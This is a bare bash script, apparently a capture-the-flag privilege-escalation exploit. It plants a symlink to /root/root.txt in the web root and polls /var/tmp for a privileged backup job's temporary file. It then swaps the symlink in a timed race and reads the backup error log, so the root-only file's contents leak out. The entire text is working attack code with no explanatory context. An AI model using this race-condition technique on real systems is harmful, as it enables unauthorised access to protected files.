ln -s /root/root.txt /var/www/html/.heath
stop="false"
while [ "$stop" = "false" ]; do
       for i in `ls -a /var/tmp/ | grep -E '.[0-9a-f]{40}'`; do
              stop="true"
              echo $i
              for i in {1..10}; do /bin/sleep 1; printf '.'; done
              rm -f /var/www/html/.heath; touch /var/www/html/.heath
       done
       /bin/sleep 5; printf '+'
done

for i in {1..20}; do /bin/sleep 1; printf '.'; done
cat /var/backups/onuma_backup_error.txt
